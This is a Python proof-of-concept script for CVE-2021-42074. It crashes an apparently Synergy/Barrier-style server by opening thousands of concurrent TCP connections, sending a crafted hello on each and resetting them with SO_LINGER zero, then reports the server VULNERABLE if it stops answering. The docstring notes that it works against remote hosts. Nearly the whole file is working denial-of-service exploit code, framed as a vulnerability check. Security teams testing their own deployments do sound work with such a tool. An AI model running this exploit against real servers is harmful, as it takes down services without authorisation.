#!/usr/bin/env python3
"""
CVE-2021-42074 - segmentation fault from rapid connect, hello, abrupt close.

Before 1.18.0 an unauthenticated peer could crash the server by opening TCP
connections quickly, sending a hello on each, and dropping them. The server
tore down the half-built client proxy while work for that connection was still
in flight, so the crash is a race and needs volume and concurrency rather than
any particular payload.

Connections are reset rather than closed politely, with SO_LINGER set to zero,
because an orderly shutdown gives the server time the race needs it not to have.

The verdict is simply whether the server is still there afterwards. A crash is
unambiguous, and unlike a memory or descriptor count it needs no access to the
target host, so this works against a remote server.

A server that drops every connection before a hello passes, because the
attacker in this advisory is unauthenticated and never gets that far. That run
does not exercise the teardown path itself, so it says so; use --no-tls or a
trusted certificate to reach it.

Exit codes: 1 VULNERABLE, 0 PASS. 2 means the check could not be run at all.
"""

import argparse
import socket
import ssl
import struct
import sys
import threading
import time

HELLO_NAMES = (b"Synergy", b"Barrier")


def hammer(host, port, count, use_tls, cert, key, stop, tally):
    """Open, greet, reset. Records connections made and hellos sent in tally."""
    ctx = None
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if cert:
            ctx.load_cert_chain(cert, key)

    made = 0
    greeted = 0
    for _ in range(count):
        if stop.is_set():
            break
        try:
            raw = socket.create_connection((host, port), timeout=2.0)
        except OSError:
            continue
        made += 1
        # reset instead of a graceful close, so the server sees the connection
        # vanish mid-handshake
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        try:
            sock = ctx.wrap_socket(raw) if ctx else raw
            sock.settimeout(1.0)
            hello = sock.recv(64)
            if hello:
                name = next((n for n in HELLO_NAMES if n in hello), b"Barrier")
                body = name + struct.pack(">hh", 1, 8) + struct.pack(">I", 7) + b"Unnamed"
                sock.sendall(struct.pack(">I", len(body)) + body)
                greeted += 1
        except (OSError, ssl.SSLError):
            pass
        finally:
            try:
                raw.close()
            except OSError:
                pass
    tally.append((made, greeted))


def server_answering(host, port, timeout=3.0):
    try:
        socket.create_connection((host, port), timeout=timeout).close()
        return True
    except OSError:
        return False


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--count", type=int, default=3000, help="connections in total")
    ap.add_argument("--threads", type=int, default=8, help="concurrent workers")
    ap.add_argument("--no-tls", action="store_true", help="skip the tls handshake")
    ap.add_argument("--cert", help="client certificate the target trusts, so a hello can be sent")
    ap.add_argument("--key", help="private key for --cert")
    args = ap.parse_args()

    if bool(args.cert) != bool(args.key):
        print("[ERROR] --cert and --key must be given together")
        return 2

    print("CVE-2021-42074 - segfault from rapid connect, hello, reset")
    print(f"target: {args.host}:{args.port}")
    print(f"{args.count} connections across {args.threads} workers, "
          f"{'plaintext' if args.no_tls else 'tls'}\n")

    if not server_answering(args.host, args.port):
        print("[ERROR] nothing accepting connections on that address")
        return 2

    per_worker = max(1, args.count // args.threads)
    tally = []
    stop = threading.Event()
    workers = []
    started = time.monotonic()
    for _ in range(args.threads):
        thread = threading.Thread(
            target=hammer, args=(args.host, args.port, per_worker, not args.no_tls, args.cert, args.key, stop, tally),
            daemon=True
        )
        thread.start()
        workers.append(thread)

    while any(t.is_alive() for t in workers):
        time.sleep(1.0)
        if not server_answering(args.host, args.port):
            stop.set()
            print(f"[*] server stopped answering after {time.monotonic() - started:.0f}s")
            break

    for thread in workers:
        thread.join(timeout=10.0)

    made = sum(m for m, _ in tally)
    greeted = sum(g for _, g in tally)
    print(f"[*] finished in {time.monotonic() - started:.0f}s, "
          f"{made} connections established, {greeted} carried a hello")
    time.sleep(2.0)

    # A crash is checked first: a server that died early also establishes few
    # connections, and reporting that as inconclusive would hide the finding.
    if not server_answering(args.host, args.port):
        print("[FAIL] server is no longer accepting connections - VULNERABLE (CVE-2021-42074)")
        print("       check the process for a segmentation fault")
        return 1

    if made < args.count // 4:
        print("[ERROR] too few connections were established to have exercised the race")
        return 2

    if greeted == 0:
        print("[PASS] server survived, though it dropped every connection before a hello,")
        print("       so an unverified peer cannot reach the handshake teardown path")
        print("       to exercise that path directly, re-run with --no-tls against a")
        print("       plaintext server, or --cert and --key for a trusted certificate")
        return 0

    print("[PASS] server survived and is still accepting connections")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
